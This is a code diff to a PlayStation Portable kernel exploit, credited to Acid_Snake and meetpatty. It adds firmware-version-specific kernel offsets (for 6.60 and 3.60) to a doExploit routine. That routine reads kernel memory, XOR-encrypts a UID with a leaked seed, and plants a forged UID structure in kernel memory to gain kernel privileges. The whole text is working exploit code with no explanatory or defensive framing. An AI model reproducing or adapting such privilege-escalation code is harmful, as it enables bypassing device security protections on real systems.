@@ -28,6 +28,9 @@ Put together by Acid_Snake and meetpatty.
 #define SYSMEM_SEED_OFFSET_365 0x88014E38
 #define SYSMEM_SEED_OFFSET_CHECK SYSMEM_TEXT+0x00002FA8
 
+#define TYPE_UID_OFFSET_660 0x880164c0
+#define TYPE_UID_OFFSET_360 0x88016dc0
+
 #define FAKE_UID_OFFSET        0x80
 
 UserFunctions* g_tbl;
@@ -117,6 +120,7 @@ int doExploit(void) {
 
     int res;
     u32 seed = 0;
+    u32 type_uid = TYPE_UID_OFFSET_360;
 
     if (_sceNpCore_8AFAB4A0 != NULL){
       u32 test_val = readKram(SYSMEM_SEED_OFFSET_CHECK);
@@ -127,6 +131,7 @@ int doExploit(void) {
       }
       else if (test_val == 0x8FBF003C){
         libc_clock_offset = LIBC_CLOCK_OFFSET_660;
+        type_uid = TYPE_UID_OFFSET_660;
       }
     }
 
@@ -144,7 +149,7 @@ int doExploit(void) {
     SceUID encrypted_uid = uid ^ seed; // encrypt UID, if there's none then A^0=A
 
     // Plant UID data structure into kernel as string
-    u32 string[] = { libc_clock_offset - 4, 0x88888888, 0x88016dc0, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
+    u32 string[] = { libc_clock_offset - 4, 0x88888888, type_uid, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
     SceUID plantid = g_tbl->KernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)string, PSP_SMEM_High, 0x10, NULL);
 
     g_tbl->KernelDcacheWritebackAll();
